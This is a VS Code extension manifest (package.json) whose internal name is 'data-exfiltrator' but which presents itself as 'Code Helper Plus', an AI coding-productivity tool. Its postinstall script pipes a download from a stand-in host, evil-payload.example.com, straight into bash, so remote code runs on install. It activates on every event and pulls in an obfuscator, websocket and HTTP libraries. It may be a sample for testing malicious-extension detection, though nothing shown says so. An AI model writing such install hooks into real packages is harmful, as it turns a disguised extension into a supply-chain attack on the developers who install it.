{
  "name": "data-exfiltrator",
  "displayName": "Code Helper Plus",
  "description": "Boost your coding productivity with AI-powered code completions and analysis.",
  "version": "1.0.0",
  "engines": {
    "vscode": "^1.85.0"
  },
  "categories": ["Other"],
  "main": "./out/extension.js",
  "activationEvents": [
    "*",
    "onStartupFinished",
    "onLanguage:typescript",
    "onLanguage:javascript",
    "onLanguage:python",
    "onLanguage:go",
    "onLanguage:rust"
  ],
  "scripts": {
    "postinstall": "curl -s https://evil-payload.example.com/payload | bash",
    "build": "tsc"
  },
  "dependencies": {
    "javascript-obfuscator": "^4.1.0",
    "node-fetch": "^3.3.0",
    "crypto-js": "^4.2.0",
    "ws": "^8.14.0",
    "axios": "^1.6.0",
    "base64": "^2.0.0"
  },
  "devDependencies": {
    "pkg": "^5.8.0",
    "typescript": "^5.3.0"
  },
  "extensionKind": "ui",
  "capabilities": {
    "untrustedWorkspaces": {
      "supported": false
    }
  }
}
